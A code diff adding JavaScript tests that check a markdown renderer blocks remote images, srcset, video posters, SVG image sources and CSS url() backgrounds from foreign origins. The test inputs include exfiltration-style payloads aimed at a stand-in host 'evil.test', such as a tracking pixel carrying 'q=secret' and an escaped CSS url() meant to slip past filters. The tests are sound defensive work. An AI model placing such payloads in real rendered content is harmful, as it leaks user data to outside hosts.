@@ -243,3 +243,75 @@ describe('createMarkdownRenderer sanitizing', () => {
     expect(el.querySelector('.chat-message-report-card-manager')).not.toBeNull();
   });
 });
+
+describe('createMarkdownRenderer remote resources', () => {
+  it('blocks images from other origins by default', () => {
+    const img = render('![x](https://evil.test/pixel?q=secret)').querySelector('img');
+
+    expect(img?.hasAttribute('src')).toBe(false);
+  });
+
+  it('allows same-origin, relative and data: images by default', () => {
+    const el = render(
+      `![a](/a.png) ![b](${location.origin}/b.png) ![c](data:image/png;base64,AAAA)`
+    );
+
+    const srcs = [...el.querySelectorAll('img')].map((i) => i.getAttribute('src'));
+    expect(srcs).toEqual([
+      '/a.png',
+      `${location.origin}/b.png`,
+      'data:image/png;base64,AAAA',
+    ]);
+  });
+
+  it('allows images from configured origins', () => {
+    const el = render('![x](https://cdn.example.com/x.png)', {
+      allowedResourceOrigins: ['https://cdn.example.com'],
+    });
+
+    expect(el.querySelector('img')?.getAttribute('src')).toBe(
+      'https://cdn.example.com/x.png'
+    );
+  });
+
+  it('allows every origin with *', () => {
+    const el = render('![x](https://anything.test/x.png)', {
+      allowedResourceOrigins: ['*'],
+    });
+
+    expect(el.querySelector('img')?.getAttribute('src')).toBe(
+      'https://anything.test/x.png'
+    );
+  });
+
+  it('blocks remote srcset, video poster and svg image sources', () => {
+    const el = render(
+      '<img srcset="https://evil.test/a.png 1x">' +
+        '<video poster="https://evil.test/p.png" src="https://evil.test/v.mp4"></video>' +
+        '<svg><image href="https://evil.test/s.png"></image></svg>'
+    );
+
+    expect(el.innerHTML).not.toContain('evil.test');
+  });
+
+  it('removes inline styles that can load resources', () => {
+    const el = render(
+      '<div style="background:url(https://evil.test/x)">a</div>' +
+        '<div style="background:\\75rl(https://evil.test/x)">b</div>'
+    );
+
+    expect(el.innerHTML).not.toContain('evil.test');
+  });
+
+  it('keeps links to other origins', () => {
+    const link = render('[x](https://other.test)').querySelector('a');
+
+    expect(link?.getAttribute('href')).toBe('https://other.test');
+  });
+
+  it('keeps built-in flag images', () => {
+    const img = render('`flag{"code":"DE","country":"Germany"}`').querySelector('img');
+
+    expect(img?.getAttribute('src')).toMatch(/flags\/de\.svg$/);
+  });
+});
